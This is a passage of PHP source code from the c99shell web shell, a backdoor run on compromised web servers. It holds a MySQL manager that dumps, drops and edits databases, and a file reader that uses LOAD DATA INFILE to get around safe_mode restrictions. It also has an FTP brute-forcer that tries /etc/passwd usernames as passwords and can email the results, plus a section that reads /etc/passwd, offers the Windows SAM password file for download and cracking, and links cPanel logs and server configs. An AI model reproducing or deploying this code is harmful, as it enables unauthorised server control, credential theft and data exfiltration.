width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
    if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
    if ($sql_act == "newtbl")
    {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
    }
    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
   }
   elseif ($sql_act == "dump")
   {
    if (empty($submit))
    {
     $diplay = false;
     echo "<form method=\"GET\"><input type=hidden name=act value=\"sql\"><input type=hidden name=\"sql_act\" value=\"dump\"><input type=hidden name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=hidden name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=hidden name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=hidden name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=hidden name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=hidden name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
     echo "<b>DB:</b>&nbsp;<input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
     $v = join (";",$dmptbls);
     echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
     if ($dump_file) {$tmp = $dump_file;}
     else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
     echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
     echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
     echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
     echo "<br><br><input type=submit name=submit value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
     echo "</form>";
    }
    else
    {
     $diplay = true;
     $set = array();
     $set["sock"] = $sql_sock;
     $set["db"] = $sql_db;
     $dump_out = "download";
     $set["print"] = 0;
     $set["nl2br"] = 0;
     $set[""] = 0;
     $set["file"] = $dump_file;
     $set["add_drop"] = true;
     $set["onlytabs"] = array();
     if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
     $ret = mysql_dump($set);
     if ($sql_dump_download)
     {
      @ob_clean();
      header("Content-type: application/octet-stream");
      header("Content-length: ".strlen($ret));
      header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
      echo $ret;
      exit;
     }
     elseif ($sql_dump_savetofile)
     {
      $fp = fopen($sql_dump_file,"w");
      if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
      else
      {
       fwrite($fp,$ret);
       fclose($fp);
       echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
      }
     }
     else {echo "<b>Dump: nothing to do!</b>";}
    }
   }
   if ($diplay)
   {
    if (!empty($sql_tbl))
    {
     if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
     $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
     $count_row = mysql_fetch_array($count);
     mysql_free_result($count);
     $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
     $tbl_struct_fields = array();
     while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
     if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
     if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
     if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
     if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
     $perpage = $sql_tbl_le - $sql_tbl_ls;
     if (!is_numeric($perpage)) {$perpage = 10;}
     $numpages = $count_row[0]/$perpage;
     $e = explode(" ",$sql_order);
     if (count($e) == 2)
     {
      if ($e[0] == "d") {$asc_desc = "DESC";}
      else {$asc_desc = "ASC";}
      $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
     }
     else {$v = "";}
     $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
     $result = mysql_query($query) or print(mysql_smarterror());
     echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
     if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
     if ($sql_tbl_act == "insert")
     {
      if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
      if (!empty($sql_tbl_insert_radio))
      {

      }
      else
      {
       echo "<br><br><b>Inserting row into table:</b><br>";
       if (!empty($sql_tbl_insert_q))
       {
        $sql_query = "SELECT * FROM `".$sql_tbl."`";
        $sql_query .= " WHERE".$sql_tbl_insert_q;
        $sql_query .= " LIMIT 1;";
        $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
        $values = mysql_fetch_assoc($result);
        mysql_free_result($result);
       }
       else {$values = array();}
       echo "<form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
       foreach ($tbl_struct_fields as $field)
       {
        $name = $field["Field"];
        if (empty($sql_tbl_insert_q)) {$v = "";}
        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
        $i++;
       }
       echo "</table><br>";
       echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
       if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=hidden name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
       echo "<br><br><input type=submit value=\"Confirm\"></form>";
      }
     }
     if ($sql_tbl_act == "browse")
     {
      $sql_tbl_ls = abs($sql_tbl_ls);
      $sql_tbl_le = abs($sql_tbl_le);
      echo "<hr size=\"1\" noshade>";
      echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
      $b = 0;
      for($i=0;$i<$numpages;$i++)
      {
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
       echo $i;
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
       if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
       else {echo "&nbsp;";}
      }
      if ($i == 0) {echo "empty";}
      echo "<form method=\"GET\"><input type=hidden name=act value=\"sql\"><input type=hidden name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=hidden name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=hidden name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=hidden name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=hidden name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=hidden name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=submit value=\"View\"></form>";
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>";
      echo "<tr>";
      echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
      for ($i=0;$i<mysql_num_fields($result);$i++)
      {
       $v = mysql_field_name($result,$i);
       if ($e[0] == "a") {$s = "d"; $m = "asc";}
       else {$s = "a"; $m = "desc";}
       echo "<td>";
       if (empty($e[0])) {$e[0] = "a";}
       if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
       else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
       echo "</td>";
      }
      echo "<td><font color=green><b>Action</b></font></td>";
      echo "</tr>";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       echo "<tr>";
       $w = "";
       $i = 0;
       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
       $i = 0;
       foreach ($row as $k=>$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "<font color=green>NULL</font>";}
        echo "<td>".$v."</td>";
        $i++;
       }
       echo "<td>";
       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
       echo "</td>";
       echo "</tr>";
      }
      mysql_free_result($result);
      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"deleterow\">Delete</option>";
      echo "</select>&nbsp;<input type=submit value=\"Confirm\"></form></p>";
     }
    }
    else
    {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "<tr>";
       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
       echo "<td>".$row["Rows"]."</td>";
       echo "<td>".$row["Type"]."</td>";
       echo "<td>".$row["Create_time"]."</td>";
       echo "<td>".$row["Update_time"]."</td>";
       echo "<td>".$size."</td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
       echo "</tr>";
       $i++;
      }
      echo "<tr bgcolor=\"000000\">";
      echo "<td><center><b>»</b></center></td>";
      echo "<td><center><b>".$i." table(s)</b></center></td>";
      echo "<td><b>".$trows."</b></td>";
      echo "<td>".$row[1]."</td>";
      echo "<td>".$row[10]."</td>";
      echo "<td>".$row[11]."</td>";
      echo "<td><b>".view_size($tsize)."</b></td>";
      echo "<td></td>";
      echo "</tr>";
      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"tbldrop\">Drop</option>";
      echo "<option value=\"tblempty\">Empty</option>";
      echo "<option value=\"tbldump\">Dump</option>";
      echo "<option value=\"tblcheck\">Check table</option>";
      echo "<option value=\"tbloptimize\">Optimize table</option>";
      echo "<option value=\"tblrepair\">Repair table</option>";
      echo "<option value=\"tblanalyze\">Analyze table</option>";
      echo "</select>&nbsp;<input type=submit value=\"Confirm\"></form></p>";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else
  {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {echo "<table border=0 width=\"100%\" height=1><tr><td width=\"30%\" height=1><b>Create new DB:</b><form action=\"".$surl."\"><input type=hidden name=act value=sql><input type=hidden name=sql_act value=newdb><input type=hidden name=sql_login value=\"".htmlspecialchars($sql_login)."\"><input type=hidden name=sql_passwd value=\"".htmlspecialchars($sql_passwd)."\"><input type=hidden name=sql_server value=\"".htmlspecialchars($sql_server)."\"><input type=hidden name=sql_port value=\"".htmlspecialchars($sql_port)."\"><input type=text name=sql_newdb size=20>&nbsp;<input type=submit value=\"Create\"></form></td><td width=\"30%\" height=1><b>View File:</b><form action=\"".$surl."\"><input type=hidden name=act value=sql><input type=hidden name=sql_act value=getfile><input type=hidden name=sql_login value=\"".htmlspecialchars($sql_login)."\"><input type=hidden name=sql_passwd value=\"".htmlspecialchars($sql_passwd)."\"><input type=hidden name=sql_server value=\"".htmlspecialchars($sql_server)."\"><input type=hidden name=sql_port value=\"".htmlspecialchars($sql_port)."\"><input type=text name=sql_getfile size=30 value=\"".htmlspecialchars($sql_getfile)."\">&nbsp;<input type=submit value=\"Get\"></form></td><td width=\"30%\" height=1></td></tr><tr><td width=\"30%\" height=1></td><td width=\"30%\" height=1></td><td width=\"30%\" height=1></td></tr></table>";}
   if (!empty($sql_act))
   {
    echo "<hr size=1 noshade>";
    if ($sql_act == "newdb")
    {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus")
    {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "<center><b>Server-status variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#433333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table></center>";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars")
    {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "<center><b>Server variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#433333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "processes")
    {
     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "<center><b>Processes:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#433333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = false;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
      else
      {
       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb); //comment it if you want to leave database
    }
   }
  }
 }
 echo "</td></tr></table>";
 if ($sql_sock)
 {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
  echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";
 }
 echo "</table>";
}
if ($act == "mkdir")
{
 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}
  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
  echo "<br><br>";
 }
 $act = $dspact = "ls";
}
if ($act == "ftpquickbrute")
{
 echo "<b>Ftp Quick brute:</b><br>";
 if (!win) {echo "This functions not work in Windows!<br><br>";}
 else
 {
  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
   if ($fqb_onlywithsh) {$true = (!in_array($sh,array("/bin/false","/sbin/nologin")));}
   else {$true = true;}
   if ($true)
   {
    $sock = @ftp_connect($host,$port,$timeout);
    if (@ftp_login($sock,$login,$pass))
    {
     echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
     ob_flush();
     return true;
    }
   }
  }
  if (!empty($submit))
  {
   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
   $fp = fopen("/etc/passwd","r");
   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
   else
   {
    if ($fqb_logging)
    {
     if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
     else {$fqb_logfp = false;}
     $fqb_log = "FTP Quick Brute (called c99shell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
     if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    }
    ob_flush();
    $i = $success = 0;
    $ftpquick_st = getmicrotime();
    while(!feof($fp))
    {
     $str = explode(":",fgets($fp,2048));
     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
     {
      echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";
      $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      $success++;
      ob_flush();
     }
     if ($i > $fqb_lenght) {break;}
     $i++;
    }
    if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
    $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
    echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
    $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
  {
   $logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
   $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
   echo "<form method=\"POST\"><br>Read first: <input type=\"text\" name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>Logging?&nbsp;<input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>Logging to file?&nbsp;<input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>Logging to e-mail?&nbsp;<input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br><input type=submit name=submit value=\"Brute\"></form>";
  }
 }
}
if ($act == "d")
{
 if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}
 else
 {
  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
  if (!$win)
  {
   echo "<tr><td><b>Owner/Group</b></td><td> ";
   $tmp = posix_getpwuid(fileowner($d));
   if ($tmp["name"] == "") {echo fileowner($d)."/";}
   else {echo $tmp["name"]."/";}
   $tmp = posix_getgrgid(filegroup($d));
   if ($tmp["name"] == "") {echo filegroup($d);}
   else {echo $tmp["name"];}
  }
  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
 }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
if ($act == "security")
{
 echo "<center><b>Server security information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>";
 if (!$win)
 {
  if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   echo "<b>*nix /etc/passwd:</b><br>";
   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
   if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
   echo "<form method=\"GET\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
   $i = $nixpwd_s;
   while ($i < $nixpwd_e)
   {
    $uid = posix_getpwuid($i);
    if ($uid)
    {
     $uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
     echo join(":",$uid)."<br>";
    }
    $i++;
   }
  }
  else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
 }
 else
 {
  $v = $_SERVER["WINDIR"]."\repair\sam";
  if (file_get_contents($v)) {echo "<b><font color=red>You can't crack winnt passwords(".$v.") </font></b><br>";}
  else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ©.</font></b><br>";}
 }
 if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}
 if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/&ft=txt")."\"><u><b>View cpanel logs</b></u></a></font></b><br>";}
 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Message Of The Day</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Hosts</b></u></a></font></b><br>";}
 function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}}
